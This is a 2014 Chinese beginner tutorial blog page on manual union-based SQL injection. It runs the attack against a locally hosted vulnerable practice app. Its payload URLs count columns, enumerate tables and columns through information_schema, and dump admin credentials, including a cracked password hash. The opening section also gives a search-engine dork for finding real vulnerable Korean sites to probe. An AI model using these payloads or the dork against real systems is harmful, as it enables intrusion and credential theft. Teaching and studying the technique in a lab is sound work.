@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>手动sql注入（初级篇） | Star</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="SQL 注入," />
+  
+
+  <meta name="description" content="我也是才学 sql 注入一个星期，此篇文章是学给初学者看的推荐书籍 《sql注入攻击与防御》">
+<meta property="og:type" content="article">
+<meta property="og:title" content="手动sql注入（初级篇）">
+<meta property="og:url" content="http://huirong.github.io/2014/07/15/手动sql注入（初级篇）/index.html">
+<meta property="og:site_name" content="Star">
+<meta property="og:description" content="我也是才学 sql 注入一个星期，此篇文章是学给初学者看的推荐书籍 《sql注入攻击与防御》">
+<meta property="og:image" content="http://img.blog.csdn.net/20140715201016711">
+<meta property="og:image" content="http://img.blog.csdn.net/20140715201042343">
+<meta property="og:image" content="http://img.blog.csdn.net/20140715201431834">
+<meta property="og:image" content="http://img.blog.csdn.net/20140715202557175">
+<meta property="og:image" content="http://img.blog.csdn.net/20140715202931238">
+<meta property="og:image" content="http://img.blog.csdn.net/20140715203207348">
+<meta property="og:updated_time" content="2016-04-16T07:20:40.665Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="手动sql注入（初级篇）">
+<meta name="twitter:description" content="我也是才学 sql 注入一个星期，此篇文章是学给初学者看的推荐书籍 《sql注入攻击与防御》">
+<meta name="twitter:image" content="http://img.blog.csdn.net/20140715201016711">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=028c63b1" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/huirong.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016sfsf1fba3xxxx8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/category/"
+            target="_self"
+            >
+            分类
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/search/"
+            target="_self"
+            >
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#I、找到存在sql注入的网站"><span class="toc-text">I、找到存在sql注入的网站</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-方法"><span class="toc-text">① 方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-原理"><span class="toc-text">② 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#③-演练平台"><span class="toc-text">③ 演练平台</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#II、检测字段长度"><span class="toc-text">II、检测字段长度</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#III、查看数据库信息"><span class="toc-text">III、查看数据库信息</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-方法-使用union语句提取数据"><span class="toc-text">① 方法:使用union语句提取数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-获取MySQL-version-user-database-等相关信息"><span class="toc-text">② 获取MySQL version user database 等相关信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IV、获取数据库数据"><span class="toc-text">IV、获取数据库数据</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#①-获取表名"><span class="toc-text">① 获取表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#②-获取字段名"><span class="toc-text">② 获取字段名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#③-获取数据"><span class="toc-text">③ 获取数据</span></a></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-手动sql注入（初级篇）" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">手动sql注入（初级篇）</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2014.07.15</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>star</span>
+        </span>
+      
+
+      
+  <span class="article-category">
+    <i class="icon-list"></i>
+    <a class="article-category-link" href="/categories/SQL-注入/">SQL 注入</a>
+  </span>
+
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="http://huirong.github.io/2014/07/15/手动sql注入（初级篇）/#disqus_thread"></a>
+        </span>
+      
+
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <p>我也是才学 sql 注入一个星期，此篇文章是学给初学者看的<br>推荐书籍 <a href="http://www.ddooo.com/softdown/50160.htm" target="_blank" rel="external">《sql注入攻击与防御》</a><br><a id="more"></a></p>
+<h1 id="I、找到存在sql注入的网站"><a href="#I、找到存在sql注入的网站" class="headerlink" title="I、找到存在sql注入的网站"></a>I、找到存在sql注入的网站</h1><h2 id="①-方法"><a href="#①-方法" class="headerlink" title="① 方法"></a>① 方法</h2><ul>
+<li>在google中输入 site:kr inurl:php?id=</li>
+<li>打开出现的网址，在网址后面添加 ’  （英文逗号）如果页面出现跳转，说明可能存在sql注入</li>
+</ul>
+<h2 id="②-原理"><a href="#②-原理" class="headerlink" title="② 原理"></a>② 原理</h2><p>一般网址都是类似  search.php?search=hello<br>相应的sql语句 可能是：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> table_name <span class="keyword">where</span> column_name=<span class="string">'hello'</span></div></pre></td></tr></table></figure></p>
+<p>如果在网址后面添加 ‘ 则sql语句为：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> table_name <span class="keyword">where</span> column_name=<span class="string">'hello'</span><span class="string">'</span></div></pre></td></tr></table></figure></p>
+<p>如果网站没有进行sql注入过滤，会报错。</p>
+<h2 id="③-演练平台"><a href="#③-演练平台" class="headerlink" title="③ 演练平台"></a>③ 演练平台</h2><p>在 GitHub 有个 Web 漏洞演练项目 <a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="external">ZVulDrill</a>，可以下载后部署在自己的电脑上（这里我就不教大家部署了，熟悉Web编程的大部分都会）</p>
+<p>网页内容如下<br><img src="http://img.blog.csdn.net/20140715201016711" alt=""></p>
+<h1 id="II、检测字段长度"><a href="#II、检测字段长度" class="headerlink" title="II、检测字段长度"></a>II、检测字段长度</h1><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/ZVulDrill-<span class="literal">master</span>/search.php?<span class="attr">search=</span>hello%' <span class="keyword">order</span> <span class="title">by</span> <span class="number">1</span>--%<span class="number">20</span></div></pre></td></tr></table></figure>
+<p>相当于sql语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> table_name <span class="keyword">where</span> colmun_name <span class="keyword">like</span> <span class="string">'%hello%'</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span> <span class="comment">-- '</span></div></pre></td></tr></table></figure></p>
+<p><font color="red">Tips：</font></p>
+<ul>
+<li>MySQL有三种注释 – 是其中一种 但是 – 后面要跟一个空格才有效。</li>
+<li>但是网址会自动去掉最后一个空格需要手动输入%20</li>
+<li>注释后面的sql语句不执行</li>
+</ul>
+<p>此时页面没有出错，用同样的方式 添加 order by 10<br>页面出错，然后 order by 5 出错，order by 4 页面正确<br>说明字段长  4</p>
+<h1 id="III、查看数据库信息"><a href="#III、查看数据库信息" class="headerlink" title="III、查看数据库信息"></a>III、查看数据库信息</h1><h2 id="①-方法-使用union语句提取数据"><a href="#①-方法-使用union语句提取数据" class="headerlink" title="① 方法:使用union语句提取数据"></a>① 方法:使用union语句提取数据</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/ZVulDrill-master/search.php?search=hello%' <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span> <span class="comment">--%20</span></div></pre></td></tr></table></figure>
+<p>sql语句<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select * from table_name where column_name like <span class="string">'%hello%'</span> and <span class="number">1</span>=<span class="number">2</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> 1,2,3,4</span></div></pre></td></tr></table></figure></p>
+<p>union前的sql语句中 where条件恒为假，结果集为空，整个sql语句返回的是union后面的结果集<br><img src="http://img.blog.csdn.net/20140715201042343" alt=""></p>
+<h2 id="②-获取MySQL-version-user-database-等相关信息"><a href="#②-获取MySQL-version-user-database-等相关信息" class="headerlink" title="② 获取MySQL version user database 等相关信息"></a>② 获取MySQL version user database 等相关信息</h2><p>如上图所示，页面上显示 1,2 ，可以利用这个来显示我们需要的信息<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">version</span>(),<span class="keyword">user</span>(),<span class="number">4</span> <span class="comment">--%20</span></div></pre></td></tr></table></figure></p>
+<p>即  将 2，3 换成 version(),user()<br>页面如下<br><img src="http://img.blog.csdn.net/20140715201431834" alt=""></p>
+<p>同理将 user() 换成 database()  得到数据库名  zvuldrill</p>
+<ul>
+<li>user() ————    wkdty@localhost</li>
+<li>version()  ————–   5.6.17 （5.0以上的版本都带有一个</li>
+<li>information_schema 的虚拟库里面存放的是所有库的信息.）</li>
+<li>database()   ————-  zvuldrill<h1 id="IV、获取数据库数据"><a href="#IV、获取数据库数据" class="headerlink" title="IV、获取数据库数据"></a>IV、获取数据库数据</h1><h2 id="①-获取表名"><a href="#①-获取表名" class="headerlink" title="① 获取表名"></a>① 获取表名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> table_name),<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'zvuldrill'</span><span class="comment">--%20</span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://img.blog.csdn.net/20140715202557175" alt=""><br>数据库中有3张表，对我们最有用的是admin这张表，以管理员身份进入网站可以看到各种信息</p>
+<h2 id="②-获取字段名"><a href="#②-获取字段名" class="headerlink" title="② 获取字段名"></a>② 获取字段名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> column_name),<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'admin'</span><span class="comment">--%20</span></div></pre></td></tr></table></figure>
+<p><img src="http://img.blog.csdn.net/20140715202931238" alt=""></p>
+<h2 id="③-获取数据"><a href="#③-获取数据" class="headerlink" title="③ 获取数据"></a>③ 获取数据</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost/ZVulDrill-master/search.php?search=hello%' and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">GROUP_CONCAT</span>(<span class="keyword">DISTINCT</span> admin_id,admin_name,admin_pass),<span class="number">4</span> <span class="keyword">from</span> <span class="keyword">admin</span><span class="comment">--%20</span></div></pre></td></tr></table></figure>
+<p><img src="http://img.blog.csdn.net/20140715203207348" alt=""></p>
+<ul>
+<li>admin_id：1 </li>
+<li>admin_name：admin</li>
+<li>admin_pass：d033e22ae348aeb5660fc2140aec35850c4da997(md5解密之后  得到admin)<br>根据用户登录入口，找到后台登录入口  ，以管理员身份进入网站</li>
+</ul>
+
+    
+  </div>
+</article>
+
+</div>
+
+
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">走过的，路过的，请支持一下我 n(*≧▽≦*)n</div>
+        <ul class="theme.donation.items.length">
+        
+          <li class="item">
+            <img src="/images/qr-wechat.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/category/"
+              target="_self"
+              >
+              分类
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/search/"
+              target="_self"
+              >
+              搜索
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'huirong';
+    
+    var disqus_url = 'http://huirong.github.io/2014/07/15/手动sql注入（初级篇）/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//huirong.disqus.com/count.js" async></script>
+
+
+
+    
+  <section class="duoshuo-comments">
+    <!-- 多说评论框 start -->
+    <div class="ds-thread" data-thread-key="http://huirong.github.io/2014/07/15/手动sql注入（初级篇）/index.html" data-title="手动sql注入（初级篇）" data-url="http://huirong.github.io/2014/07/15/手动sql注入（初级篇）/index.html"></div>
+    <!-- 多说评论框 end -->
+  </section>
+
+
+
+
+  <script type="text/javascript">
+  var duoshuoQuery = {short_name:"star"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0]
+     || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+  </script>
+
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
